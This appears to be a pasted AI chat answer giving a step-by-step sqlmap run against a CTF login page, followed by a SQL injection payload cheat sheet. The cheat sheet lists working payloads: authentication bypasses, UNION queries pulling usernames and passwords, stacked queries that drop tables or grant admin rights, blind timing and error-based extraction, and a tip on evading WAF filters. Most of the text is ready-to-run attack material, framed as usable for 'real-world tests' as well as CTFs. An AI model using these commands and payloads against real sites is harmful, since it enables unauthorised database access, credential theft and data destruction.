 here‚Äôs a step-by-step sqlmap run for a typical CTF login page.
This assumes you already have:

    The login page URL (e.g., http://target.site/login.php)

    A test username & password field name (check page HTML source or Burp request)

1Ô∏è‚É£ First, capture the request with Burp Suite

    Open Burp ‚Üí turn intercept ON

    Try logging in with any fake username/password

    Right-click ‚Üí Save request to file (e.g., login.req)

2Ô∏è‚É£ Run sqlmap against that request

sqlmap -r login.req --batch --risk=3 --level=5 --threads=5 --dbs

What this does:

    -r login.req ‚Üí uses your saved HTTP request

    --batch ‚Üí skips prompts, runs with defaults

    --risk=3 --level=5 ‚Üí enables more aggressive tests

    --threads=5 ‚Üí speeds up scanning

    --dbs ‚Üí enumerates database names if vulnerable

3Ô∏è‚É£ If vulnerable, dump the data

Replace DBNAME and TABLENAME with what you found:

sqlmap -r login.req -D DBNAME -T TABLENAME --dump

4Ô∏è‚É£ Quick inline attack without Burp (if params in URL)

If your target login request looks like:

http://target.site/login.php?user=admin&pass=123

You can run:

sqlmap -u "http://target.site/login.php?user=admin&pass=123" --batch --risk=3 --level=5 --dbs

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Alright ‚Äî here‚Äôs your full categorized SQL Injection cheat sheet for your notes, with all the major syntaxes, concatenation tricks, and comment styles used in CTFs and real-world tests.
üîπ 1. Basic Always-True Conditions

These force the query to return all rows by making the WHERE condition always true.

MySQL / MSSQL style

' OR 1=1--
" OR 1=1--
' OR 1=1#
" OR 1=1#
' OR 1=1/*
" OR 1=1/*

String comparison style

' OR '1'='1'--
" OR "1"="1"--
' OR '1'='1'#
' OR 'a'='a'--

üîπ 2. String Concatenation Variations

Used in PostgreSQL, Oracle, SQLite where || concatenates strings.

' || '1'='1'--
' || '1'='1'#
' || '1'='1'/*
' || '1'='1';--

üîπ 3. UNION-Based Injections

Used to fetch extra data from other tables.

' UNION SELECT null--
' UNION SELECT null,null--
' UNION SELECT username,password FROM users--
' UNION ALL SELECT 1,2,3--

üí° Number of null values must match the number of columns.
üîπ 4. Stacked Queries (if allowed)

Works if the database supports multiple queries in a single request.

'; DROP TABLE users;--
'; UPDATE users SET admin=1 WHERE id=1;--
'; INSERT INTO logins(username,password) VALUES('hacker','pass');--

üîπ 5. Comment Styles

Different DB engines accept different comment syntaxes.

--       (double dash + space)  ‚úÖ MySQL, MSSQL, PostgreSQL
#        ‚úÖ MySQL only
/* ... */ ‚úÖ MySQL, MSSQL, PostgreSQL

Example:

' OR 1=1-- 
' OR 1=1# 
' OR 1=1/*

üîπ 6. Time-Based Blind SQL Injection

Used when output isn‚Äôt visible, but execution time reveals true/false.

MySQL

' OR IF(1=1,SLEEP(5),0)--

PostgreSQL

' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

MSSQL

' OR IF(1=1) WAITFOR DELAY '0:0:5'--

üîπ 7. Error-Based Injection

Forcing errors to extract data.

MySQL

' AND EXTRACTVALUE(1, CONCAT(0x7e, version(), 0x7e))--

PostgreSQL

' AND CAST((SELECT version()) AS int)--

üîπ 8. Order By & Column Count Enumeration

Find the number of columns in the result set.

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

When it errors, the last working number is the column count.
üîπ 9. Authentication Bypass Quickies

' OR ''='
" OR ""="
') OR ('1'='1
admin'-- 
admin' #
admin'/*

‚úÖ Pro tip for CTFs & bug bounty: Always adapt to the database type first.

    MySQL / MSSQL ‚Üí use OR, #, --, /* */

    PostgreSQL / Oracle / SQLite ‚Üí use || for concatenation

    Always check for WAF filters and URL encoding tricks if payloads get blocked.
